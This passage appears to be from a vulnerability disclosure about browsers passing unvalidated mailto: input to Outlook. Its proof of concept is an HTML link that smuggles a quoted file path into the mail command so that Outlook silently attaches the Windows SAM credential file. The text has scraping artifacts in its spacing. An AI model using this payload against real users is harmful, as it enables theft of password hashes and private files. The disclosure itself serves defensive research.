In ， our example ， \"C : PROGRA ~ 1MICROS ~ 3OFFICE11OUTLOOK.EXE\" -c IPM.Note /m \"%1\" ， would become ， \"C : PROGRA ~ 1MICROS ~ 3OFFICE11OUTLOOK.EXE\" -c IPM.Note /m \"mailto : someone ( at ) somewhere ( dot ) com [ email concealed ] \" ， There is absolutely no input validation in all the browsers I have tested , i.e. there are exploits ， availible by entering more data into the address bar than was intended. ， Proof-of Concept :  ， The mailto application protocol can be axploited by entering <email>\"<filepath> , this will cause ， OUTLOOK.EXE to attach the file <filepath> to the email without asking for permission , thus opening ， up for sensitive files to be stolen when a user sends an email it is fair to believe that many ， people would not notice the attached file before sending the email. ， To attach the SAM file to a email a html file could contain this :  ， <a href='mailto : someone ( at ) somewhere ( dot ) com [ email concealed ] \".windowsREPAIRSAM'>C ， lick here to email me</a> ， The command being run would now be :  ， \"C : PROGRA ~ 1MICROS ~ 3OFFICE11OUTLOOK.EXE\" -c IPM.Note /m \"mailto : someone ( at ) somewhere ( dot ) com [ email concealed ] \".windowsREPAIRSAM\" ，  , thus attaching the SAM file.",
